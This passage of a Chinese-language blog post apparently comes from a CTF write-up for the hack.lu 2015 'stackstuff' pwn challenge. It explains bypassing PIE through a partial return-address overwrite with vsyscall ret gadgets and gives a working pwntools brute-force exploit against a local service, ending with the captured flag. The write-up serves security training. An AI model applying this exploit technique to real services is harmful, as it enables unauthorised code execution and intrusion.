<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000106D loc_106D:</span><br><span class="line">.text:000000000000106D mov     rax, [rsp+58h+stream]</span><br><span class="line">.text:0000000000001072 mov     rdi, rax        ; stream</span><br><span class="line">.text:0000000000001075 call    _fclose</span><br><span class="line">.text:000000000000107A lea     rdi, aHiThisIsTheFla ; &quot;Hi! This is the flag download service.&quot;</span><br><span class="line">.text:0000000000001081 call    _puts</span><br><span class="line">.text:0000000000001086 call    require_auth</span><br><span class="line">.text:000000000000108B lea     rsi, modes      ; &quot;r&quot;</span><br><span class="line">.text:0000000000001092 lea     rdi, aFlag      ; &quot;flag&quot;</span><br><span class="line">.text:0000000000001099 call    _fopen</span><br></pre></td></tr></table></figure>

<p>现在目标就是在栈上写两个<code>ret</code>指令的地址并覆盖<code>0x0x007fffffffe3a8</code>处最低两个字节保持地址值不变即可</p>
<h3 id="vsyscall"><a href="#vsyscall" class="headerlink" title="vsyscall"></a>vsyscall</h3><p>即使开了PIE随机化，还有一个<code>vsyscall</code>段，它的地址是固定的，其中有ret指令可以满足我们的要求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vmmap</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x0000555555554000 0x0000555555556000 0x0000000000000000 r-x /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff</span><br><span class="line">0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff</span><br><span class="line">0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap]</span><br><span class="line">0x00007ffff7dcc000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so</span><br><span class="line">0x00007ffff7df1000 0x00007ffff7f64000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so</span><br><span class="line">0x00007ffff7f64000 0x00007ffff7fad000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so</span><br><span class="line">0x00007ffff7fad000 0x00007ffff7fb0000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so</span><br><span class="line">0x00007ffff7fb0000 0x00007ffff7fb3000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so</span><br><span class="line">0x00007ffff7fb3000 0x00007ffff7fb9000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]</span><br><span class="line">0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]</span><br><span class="line">0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so</span><br><span class="line">0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so</span><br><span class="line">0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]		# here  （环境为ubuntu22.08）</span><br><span class="line">gef➤  x/4i 0xffffffffff600800</span><br><span class="line">   0xffffffffff600800:    mov    rax,0x135</span><br><span class="line">   0xffffffffff600807:    syscall</span><br><span class="line">   0xffffffffff600809:    ret    </span><br><span class="line">   0xffffffffff60080a:    int3</span><br></pre></td></tr></table></figure>

<p>注意不论怎么随机化最低12bit的<code>08b</code>是不变的（页对齐），因此需要爆破倒数第二个字节，但最多也只需爆破16次，即从<code>0x008b,0x108b...0xf08b</code></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdbyte = <span class="number">0x00</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    client = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">1514</span>)</span><br><span class="line">    client.sendlineafter(<span class="string">b&#x27;Length&#x27;</span>, <span class="string">b&#x27;60&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;h&#x27;</span> * <span class="number">0x48</span> + p64(<span class="number">0xffffffffff600800</span>) * <span class="number">2</span>		<span class="comment"># padding 加上两次ret</span></span><br><span class="line">    payload += <span class="string">b&#x27;\x8b&#x27;</span> + p8(rdbyte)		<span class="comment"># 覆盖倒数两个字节</span></span><br><span class="line">    rdbyte += <span class="number">0x10</span>	<span class="comment"># 爆破</span></span><br><span class="line">    client.sendline(payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;&#123;&#x27;</span> <span class="keyword">in</span> client.recvall():</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    client.close()</span><br><span class="line"><span class="comment"># flag&#123;g0ttem_b0yz&#125;</span></span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/09/03/Hacklu2015-stackstuff-wp/#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
    
     <a href="/page/3/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
      

        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
 
       <a href="/page/5/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
        

  
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
	<div class="widget">
		<h4>Categories</h4>
		<ul class="tag_box inline list-unstyled">
		
			<li><a href="/categories/CVE/">CVE<span>11</span></a></li>
		
			<li><a href="/categories/fuzz/">fuzz<span>2</span></a></li>
		
			<li><a href="/categories/pwn-learning/">pwn-learning<span>5</span></a></li>
		
			<li><a href="/categories/pwn-wp/">pwn-wp<span>22</span></a></li>
		
			<li><a href="/categories/reverse-learning/">reverse-learning<span>1</span></a></li>
		
			<li><a href="/categories/reverse-wp/">reverse-wp<span>6</span></a></li>
		
			<li><a href="/categories/web-learning/">web-learning<span>8</span></a></li>
		
			<li><a href="/categories/web-wp/">web-wp<span>54</span></a></li>
		
		</ul>
	</div>

		
			
	<div class="widget">
		<h4>Tag Cloud</h4>
		<ul class="tag_box inline list-unstyled">		
		
			<li><a href="/tags/rce/">rce<span>19</span></a></li>
		
			<li><a href="/tags/sql/">sql<span>8</span></a></li>
		
			<li><a href="/tags/HGAME2023/">HGAME2023<span>2</span></a></li>
		
			<li><a href="/tags/HS2019/">HS2019<span>1</span></a></li>
		
			<li><a href="/tags/upload/">upload<span>4</span></a></li>
		
			<li><a href="/tags/libc/">libc<span>1</span></a></li>
		
			<li><a href="/tags/HDCTF2023/">HDCTF2023<span>5</span></a></li>
		
			<li><a href="/tags/ciscn2023/">ciscn2023<span>4</span></a></li>
		
			<li><a href="/tags/CTF/">CTF<span>94</span></a></li>
		
			<li><a href="/tags/无参函数构造rce/">无参函数构造rce<span>2</span></a></li>
		
			<li><a href="/tags/nssctf/">nssctf<span>58</span></a></li>
		
			<li><a href="/tags/SwampCTF2019/">SwampCTF2019<span>1</span></a></li>
		
			<li><a href="/tags/javascript/">javascript<span>1</span></a></li>
		
			<li><a href="/tags/DASCTF2023/">DASCTF2023<span>1</span></a></li>
		
			<li><a href="/tags/pickle/">pickle<span>1</span></a></li>
		
			<li><a href="/tags/uaf/">uaf<span>2</span></a></li>
		
			<li><a href="/tags/create-function/">create_function<span>2</span></a></li>
		
			<li><a href="/tags/ret2syscall/">ret2syscall<span>2</span></a></li>
		
			<li><a href="/tags/scxml/">scxml<span>1</span></a></li>
		
			<li><a href="/tags/HNCTF2022/">HNCTF2022<span>2</span></a></li>
		
		
		   <li><a href="/tags">...<span>126</span></a></li>
		 
		</ul>
	</div>


		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2024/01/19/Spring4Shell漏洞/" ><i class="fa fa-file-o"></i>Spring4Shell漏洞(CVE-2022-229...</a>
      </li>
    
      <li>
        <a href="/2024/01/16/JNDI注入/" ><i class="fa fa-file-o"></i>JNDI注入</a>
      </li>
    
      <li>
        <a href="/2024/01/11/HTB-bizness-wp/" ><i class="fa fa-file-o"></i>HTB-bizness-wp</a>
      </li>
    
      <li>
        <a href="/2024/01/10/node反序列化RCE/" ><i class="fa fa-file-o"></i>node反序列化RCE(CVE-2017-5941)</a>
      </li>
    
      <li>
        <a href="/2024/01/04/HNCTF2023-BabyJxVx-wp/" ><i class="fa fa-file-o"></i>HNCTF2023-BabyJxVx-wp</a>
      </li>
    
  </ul>
</div>

		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer>  </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



</body>
   </html>
